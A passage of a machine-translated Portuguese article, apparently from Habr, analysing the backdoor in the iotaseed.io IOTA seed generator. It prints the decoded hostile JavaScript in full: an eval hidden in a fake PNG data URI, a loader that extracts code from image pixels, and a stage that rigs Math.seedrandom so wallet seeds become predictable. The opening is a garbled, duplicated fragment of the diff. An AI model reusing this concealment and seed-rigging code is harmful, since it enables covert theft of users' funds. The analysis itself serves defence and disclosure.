&lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> whvwdzafABTh / tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM / ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp + ioWy2JAbWYqQ6E + mv5SwyNzJWh / HHX6Rty17TYNBFF44CokEA + ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833 / N0bI85X / CarUEte9b68nlf4rg + lKoEGAvPMvzk6 + Ak5OwZ71u / S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp / vlzDefw0hYOWf4b1 + 3Tt5 + 3MfcZ7NxnnPX0Uu // 7StQUhwgmNk / N9x3ENDpfF / P7E6 / 6rM1qt8K0BXMjsOs7 + eZKNR95KMSQfCgS / pUY4TuPUdlEHlOPnCXj7H2B1e9 <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> </pre> <br>  Parece que algu√©m fez altera√ß√µes com muito cuidado na biblioteca Notifier.js para ocultar um peda√ßo de c√≥digo nela.  O m√©todo <font color="#e83e8c"><code>Notifier.notify</code></font> foi alterado para verificar se o par√¢metro cont√©m a <font color="#e83e8c"><code>image ",T"</code></font> .  Em seguida, decodifica parte do par√¢metro em JavaScript e o processa.  Outra altera√ß√£o adicionou o m√©todo <font color="#e83e8c"><code>Notifier.init()</code></font> , chamado ap√≥s o carregamento da p√°gina.  Ele, por sua vez, chamou o m√©todo de <font color="#e83e8c"><code>notify</code></font> com o par√¢metro <font color="#e83e8c"><code>image</code></font> , o que provocou o acionamento desse c√≥digo. <br><br>  A execu√ß√£o do fragmento de c√≥digo acima <font color="#e83e8c"><code>atob(image.split(",")[2])</code></font> com o link de dados especificado fornece o seguinte fragmento de c√≥digo (recuos e espa√ßos s√£o adicionados para melhorar a legibilidade): <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">cDis</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = document.createElement(<span class="hljs-string"><span class="hljs-string">"canvas"</span></span>).getContext(<span class="hljs-string"><span class="hljs-string">"2d"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Image; i.onload = function() { o.drawImage(i, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); dS(o.getImageData(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">298</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>).data) }; i.src = f } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dS</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(d)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-number"><span class="hljs-number">21</span></span>, bM = <span class="hljs-string"><span class="hljs-string">""</span></span>, tM = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; l; i++) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = (d[i * <span class="hljs-number"><span class="hljs-number">4</span></span> + <span class="hljs-number"><span class="hljs-number">2</span></span>] &gt;&gt;&gt; <span class="hljs-number"><span class="hljs-number">0</span></span>).toString(<span class="hljs-number"><span class="hljs-number">2</span></span>); bM += b[b.length - <span class="hljs-number"><span class="hljs-number">1</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bM.length == <span class="hljs-number"><span class="hljs-number">16</span></span>) { l = parseInt(bM, <span class="hljs-number"><span class="hljs-number">2</span></span>) + <span class="hljs-number"><span class="hljs-number">16</span></span>; bM = <span class="hljs-string"><span class="hljs-string">""</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bM.length == <span class="hljs-number"><span class="hljs-number">8</span></span> &amp;&amp; l != <span class="hljs-number"><span class="hljs-number">21</span></span>) { tM += String.fromCharCode(parseInt(bM, <span class="hljs-number"><span class="hljs-number">2</span></span>)); bM = <span class="hljs-string"><span class="hljs-string">""</span></span> } } eval(tM) } cDis(<span class="hljs-string"><span class="hljs-string">"./images/logo_small_bottom.png"</span></span>);</code> </pre> <br>  A segunda parte do c√≥digo malicioso insere <font color="#e83e8c"><code>./images/logo_small_bottom.png</code></font> no elemento &lt;canvas&gt; oculto fora da tela, l√™ a imagem na forma de texto e processa esse texto como c√≥digo javascript. <br><br>  O arquivo <font color="#e83e8c"><code>logo_small_bottom.png</code></font> foi adicionado ao reposit√≥rio em 28 de agosto de 2017 e atualizado 3 horas depois.  Ambas as vers√µes passadas por esse decodificador de imagem n√£o produzem c√≥digo v√°lido. <br><br>  No entanto, outra imagem foi usada na c√≥pia WM salva do site.  O c√≥digo a seguir est√° oculto nele (recuo √© adicionado novamente por conveni√™ncia): <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-regexp"><span class="hljs-regexp">/ps:.*\.io/</span></span>.test(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location)) { mode = <span class="hljs-string"><span class="hljs-string">"M"</span></span>; (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">message</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> name = <span class="hljs-string"><span class="hljs-string">"edr"</span></span>; name += <span class="hljs-string"><span class="hljs-string">"an"</span></span>; message[<span class="hljs-string"><span class="hljs-string">"cont"</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; name += <span class="hljs-string"><span class="hljs-string">"dom"</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">show</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">arg, options, image</span></span></span><span class="hljs-function">) </span></span>{ message[<span class="hljs-string"><span class="hljs-string">"e2"</span></span> + name](<span class="hljs-string"><span class="hljs-string">"4782588875512803642"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>(message[<span class="hljs-string"><span class="hljs-string">"cont"</span></span>]), options, image); message[<span class="hljs-string"><span class="hljs-string">"cont"</span></span>] += <span class="hljs-number"><span class="hljs-number">1</span></span> } message[<span class="hljs-string"><span class="hljs-string">"e2"</span></span> + name] = message[<span class="hljs-string"><span class="hljs-string">"se"</span></span> + name]; message[<span class="hljs-string"><span class="hljs-string">"se"</span></span> + name] = show })(<span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(mode + <span class="hljs-string"><span class="hljs-string">"ath"</span></span>)) }</code> </pre> <br>  Este √© o √∫ltimo est√°gio do backdoor javascript.  Pode ser simplificado para o seguinte c√≥digo: <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.cont = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">show</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">arg, options, image</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.e2edrandom(<span class="hljs-string"><span class="hljs-string">"4782588875512803642"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.cont), options, image); <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.cont += <span class="hljs-number"><span class="hljs-number">1</span></span>; } <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.e2edrandom = <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.seedrandom; <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.seedrandom = show;</code> </pre> <br>  Esse c√≥digo altera a fun√ß√£o <font color="#e83e8c"><code>Math.seedrandom</code></font> <a href="">usada pelo c√≥digo de gera√ß√£o,</a> para que ele sempre <font color="#e83e8c"><code>4782588875512803642</code></font> semente constante <font color="#e83e8c"><code>4782588875512803642</code></font> e adicione a ela o valor da vari√°vel counter, aumentando em um a cada vez que o <font color="#e83e8c"><code>seedrandom</code></font> iniciado.  Isso faz com que <font color="#e83e8c"><code>Math.random()</code></font> sempre retorne a mesma seq√º√™ncia previs√≠vel de n√∫meros.  Como resultado, a semente gerada de cada nova carteira IOTA sempre permaneceu a mesma.  Isso se torna bastante √≥bvio se voc√™ tentar abrir a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=http://web.archive.org/web/20180103035549/">vers√£o de arquivo</a> morto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=http://web.archive.org/web/20180103035549/">do</a> iotaseed.io v√°rias vezes e observar que a semente gerada sempre permanece <font color="#e83e8c"><code>XZHKIPJIFZFYJJMKBVBJLQUGLLE9VUREWK9QYTITMQYPHBWWPUDSATLLUADKSEEYWXKCDHWSMBTBURCQD</code></font> . <br><br>  √â importante observar aqui que o n√∫mero usado para gerar ( <font color="#e83e8c"><code>"4782588875512803642"</code></font> no exemplo acima) foi diferente para cada usu√°rio.  Como o WM salvou uma c√≥pia da imagem em um determinado momento, a semente permanece a mesma sempre que voc√™ abre uma c√≥pia para a mesma data.  As verifica√ß√µes para outras datas, por exemplo, 31 de outubro ou 19 de novembro, mostram que seus n√∫meros e sementes diferem da c√≥pia que examinamos em 3 de janeiro.  Com base nisso, podemos concluir que o arquivo <font color="#e83e8c"><code>./images/logo_small_bottom.png</code></font> gerado rapidamente pelo servidor iotaseed.io. <br><br>  Durante a cria√ß√£o desse arquivo, o n√∫mero usado pelo gerador de n√∫meros aleat√≥rios corrigido foi alterado e provavelmente armazenado em algum lugar para que um invasor pudesse us√°-lo posteriormente para roubar o IOTA.  Como resultado, o site gerou sementes diferentes para diferentes usu√°rios.  No entanto, a situa√ß√£o com gera√ß√£o aleat√≥ria no lado do servidor tamb√©m n√£o foi a melhor, pois sabe-se que pelo menos uma pessoa <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">recebeu</a> uma semente no site que algu√©m j√° usou.  Uma demonstra√ß√£o da diferen√ßa de c√≥digo est√° dispon√≠vel neste <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">link</a> . <br><br>  Usando o oficial <a href="">Javascript-biblioteca do IOTA</a> , podemos estabelecer que o mencionado anteriormente Sid <font color="#e83e8c"><code>XZHKIPJIFZFYJJMKBVBJLQUGLLE9VUREWK9QYTITMQYPHBWWPUDSATLLUADKSEEYWXKCDHWSMBTBURCQD</code></font> corresponde ao endere√ßo <font color="#e83e8c"><code>PUEBLAHRQGOTIAMJHCCXXGQPXDQJS9BDFSCDSMINAYJNSILCCISDVY99GMKAEIAICYQUXMIYTNQCJYVDX</code></font> .  De acordo com <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">este site</a> , a carteira est√° vazia, mas outros sites exploradores do hist√≥rico de transa√ß√µes apresentam um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">erro 404</a> .  Isso significa que eu cometi um erro ao decodificar o endere√ßo ou n√£o entendi como a rede IOTA funciona. <br><br><h3>  Conclus√£o </h3><br>  A porta dos fundos estava escondida astuciosamente.  Definitivamente, foi colocado l√° com inten√ß√£o maliciosa, e n√£o por causa de um erro com o uso de criptografia.  N√£o est√° claro at√© o fim se ele foi adicionado pelo propriet√°rio do reposit√≥rio github e do site norbertvdberg, ou se sua conta de hospedagem foi invadida.  Seja como for, a julgar pela rea√ß√£o do propriet√°rio, que excluiu suas contas no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">GitHub</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Reddit</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Quora</a> , verifica-se que o site foi originalmente concebido para roubar fundos dos usu√°rios. <br><br>  Os invasores deram muitos passos para esconder a porta dos fundos.  Uma r√°pida olhada no painel do desenvolvedor em um navegador n√£o revelaria nada de suspeito.  Por exemplo, <font color="#e83e8c"><code>data:</code></font> link no primeiro est√°gio do backdoor come√ßou com o <font color="#e83e8c"><code>iVBORw0KGgo</code></font> que corresponde ao in√≠cio de um cabe√ßalho PNG v√°lido codificado na base 64. Isso significa que esse URL pode ser facilmente confundido com uma inser√ß√£o de imagem - a a√ß√£o √© bastante normal para uma biblioteca js de notifica√ß√£o.  Parte do c√≥digo javascript √© carregado a partir da imagem e sua solicita√ß√£o √© a √∫nica solicita√ß√£o de rede.  Infelizmente, tudo isso acabou sendo suficiente para fazer muitas pessoas acreditarem que tudo est√° em ordem com o site. <br><br>  Um estudo cuidadoso do painel do desenvolvedor no navegador permite que voc√™ veja essa solicita√ß√£o. <br><br> <a href=""><img src="https://habrastorage.org/webt/ov/jt/ib/ovjtibg61gubqtlmc1n39w0xfhy.png"></a> <br><br>  Em geral, esse incidente deve ser lembrado de que, quando se trata de criptomoedas (e especialmente grandes quantidades!), A paran√≥ia pode ser uma coisa boa.  Voc√™ nunca deve confiar em servi√ßos on-line, como geradores de frases-semente ou carteiras da Web, confiando neles valores significativos para voc√™.  Voc√™ precisa usar apenas o software que passou por uma revis√£o e auditoria minuciosas pela comunidade. <br><br>  No nosso caso, o iotaseed.io realmente se posicionou como uma solu√ß√£o de c√≥digo aberto, indicando abertura e a capacidade de verificar o c√≥digo por qualquer pessoa.  Parecia que isso era suficiente para convencer algumas pessoas, mas nenhuma delas pensava que o c√≥digo real em execu√ß√£o no site pudesse ser alterado.  Uma verifica√ß√£o cuidadosa revelaria esse fato, dando-nos outro exemplo de quais s√©rias conseq√º√™ncias a confian√ßa cega no r√≥tulo de c√≥digo-fonte aberto pode levar, especialmente no campo de criptomoedas. <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/files/4bd/bf6/597/4bdbf659775744b1bdbb4d8a00a0a980.png" alt="imagem"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt410041/">https://habr.com/ru/post/pt410041/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt410031/index.html">Classifica√ß√£o de plataformas de pesquisa de componentes eletr√¥nicos</a></li>
<li><a href="../pt410033/index.html">Impress√£o em metal 3D no Formnext 2017</a></li>
<li><a href="../pt410035/index.html">Estudo CoinDesk: apenas 19% dos investidores tomaram empr√©stimos para comprar criptomoeda</a></li>
<li><a href="../pt410037/index.html">Pergunte a Ethan: N√£o √© est√∫pido sonhar em terraformar Marte?</a></li>
<li><a href="../pt410039/index.html">Dane, distribuindo instru√ß√µes para usu√°rios do Popcorn Time, foi a julgamento</a></li>
<li><a href="../pt410043/index.html">Taxa de minera√ß√£o: como vai funcionar</a></li>
<li><a href="../pt410045/index.html">Cientistas criaram um "oceano alien√≠gena" para testar as qualidades de um rob√¥ subaqu√°tico</a></li>
<li><a href="../pt410047/index.html">Intel RealSense D400 - C√¢meras de realidade digital</a></li>
<li><a href="../pt410049/index.html">Dados amea√ßam quebrar a f√≠sica</a></li>
<li><a href="../pt410053/index.html">Como o Alasca combate a desigualdade digital</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>